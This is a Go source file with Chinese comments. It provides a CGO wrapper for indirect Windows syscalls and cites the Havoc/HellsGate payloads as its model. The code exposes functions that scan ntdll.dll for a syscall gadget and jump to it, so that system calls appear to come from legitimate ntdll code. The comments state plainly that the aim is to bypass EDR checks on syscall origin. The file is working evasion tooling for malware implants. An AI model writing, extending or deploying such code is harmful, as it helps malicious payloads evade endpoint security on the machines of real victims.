//go:build windows && amd64 && cgo

// Package stub 提供间接 syscall 的 CGO 实现。
// 参考 Havoc/HellsGate payload。
//
// CGO 编译 indirect_syscall.c，该文件包含：
//  1. find_syscall_gadget() — 扫描 ntdll.dll .text 段查找 syscall (0F 05) 指令
//  2. indirect_syscall_variadic() — 支持可变参数的间接 syscall（最多 10 个参数）
//
// 这使得 syscall 看起来来自 ntdll.dll 的合法代码页，绕过 EDR 对 syscall 来源的检查。
package stub

/*
#cgo CFLAGS: -O2 -I../crt
long long indirect_syscall_variadic(unsigned int, int, unsigned long long*);
unsigned long long get_syscall_gadget(void);
unsigned long long find_syscall_gadget(void);
*/
import "C"

// IndirectSyscall 执行间接系统调用。
//
// 实现：
//  1. 首次调用时扫描 ntdll.dll 内存找到 syscall (0F 05) 指令地址
//  2. 设置 eax = SSN, r10 = arg1, 其余参数按 Windows x64 约定放置
//     (arg1→rcx, arg2→rdx, arg3→r8, arg4→r9, arg5→[rsp+0x20], ...)
//  3. jmp 到 ntdll 中的 syscall 指令（后跟 ret）
//  4. ntdll 的 ret 返回到 Go 调用者
//
// syscallNum 是从 ntdll.dll 导出表中解析出的 syscall 编号。
// 所有参数都通过 C 内联汇编传递，无 4 参数限制。
func IndirectSyscall(syscallNum uint32, args ...uintptr) int64 {
	if len(args) == 0 {
		return int64(C.indirect_syscall_variadic(C.uint(syscallNum), 0, nil))
	}
	// 将 Go uintptr slice 转为 C 数组
	cArgs := make([]C.ulonglong, len(args))
	for i, a := range args {
		cArgs[i] = C.ulonglong(a)
	}
	return int64(C.indirect_syscall_variadic(
		C.uint(syscallNum),
		C.int(len(args)),
		(*C.ulonglong)(&cArgs[0]),
	))
}

// GetSyscallGadget 返回 ntdll.dll 中 syscall (0F 05) 指令的地址。
// 首次调用时扫描 ntdll.dll .text 段查找，后续返回缓存值。
// 可用于诊断或需要直接使用 gadget 地址的场景。
// 返回 0 表示查找失败。
func GetSyscallGadget() uintptr {
	return uintptr(C.get_syscall_gadget())
}

// FindSyscallGadget 强制重新扫描 ntdll.dll 查找 syscall gadget。
// 一般不需要调用，IndirectSyscall 会自动缓存结果。
func FindSyscallGadget() uintptr {
	return uintptr(C.find_syscall_gadget())
}
